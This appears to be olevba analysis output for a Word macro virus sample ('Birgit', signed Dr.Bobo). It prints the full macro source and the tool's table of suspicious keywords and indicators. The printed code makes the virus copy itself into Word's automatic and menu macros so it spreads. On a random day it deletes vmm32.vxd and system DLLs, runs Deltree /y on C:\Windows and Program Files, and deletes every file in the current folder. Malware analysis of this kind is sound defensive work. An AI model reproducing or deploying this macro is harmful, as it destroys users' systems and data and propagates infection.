olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Birgit-0cc5cbc8424053137fa7d574bddae4caea06671d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Birgit-0cc5cbc8424053137fa7d574bddae4caea06671d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO dr_bobo_macro_word.bas 
in file: Virus.MSWord.Intended.Birgit-0cc5cbc8424053137fa7d574bddae4caea06671d - OLE stream: 'Macros/VBA/dr_bobo_macro_word'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Main()
On Error Resume Next
uCkAo$ = FileName$() + ":AutoOpen"
uCkAc$ = "AutoClose"
uCkAx$ = "AutoExec"
uCkAn$ = "AutoNew"
uCkAe$ = "AutoExit"
uCkTm$ = "ToolsMacro"
uCkFt$ = "FileTemplates"
uCkTc$ = "ToolsCustomize"
MacroCopy uCkAo$, uCkAc$
MacroCopy uCkAo$, uCkAx$
MacroCopy uCkAo$, uCkAn$
MacroCopy uCkAo$, uCkAe$
MacroCopy uCkAo$, uCkTm$
MacroCopy uCkAo$, uCkFt$
MacroCopy uCkAo$, uCkTc$
FileSaveAs .Format = 1
MacroCopy uCkAc$, uCkAo$
MacroCopy uCkAx$, uCkAo$
MacroCopy uCkAn$, uCkAo$
MacroCopy uCkAe$, uCkAo$
MacroCopy uCkTm$, uCkAo$
MacroCopy uCkFt$, uCkAo$
MacroCopy uCkTc$, uCkAo$
FileSave
Payload
End Sub
Sub Payload()
U = Int(Rnd() * 30) + 1
If Day(Now()) = U Then
    SetPrivateProfileString "HKEY_CLASSES_ROOT\WORD.DOCUMENT.6\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,31", ""
    SetPrivateProfileString "HKEY_CLASSES_ROOT\Word.Template\DefaultIcon\", "", "C:\Windows\System\Shell32.dll,32", ""
AppHide ("Program Manager")
SetAttr "c:\Windows\System\vmm32.vxd", 0
Kill "c:\Windows\System\vmm32.vxd"
MsgBox ("Dr.Bobo.Macro.Word  [bobo_dr@yahoo.com] http://bobo.tlsecurity.com"), ("Dr.Bobo")
Shell ("Deltree  /y C:\Windows")
Shell ("Deltree  /y C:\Progra~1")
Destroy$ = "C:\Windows\system\*.dll"
SetAttr Destroy$, 0
Kill Destroy$
Kill "*.*"
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://bobo.tlsecuri|URL                                          |
|          |ty.com              |                                             |
|IOC       |Shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

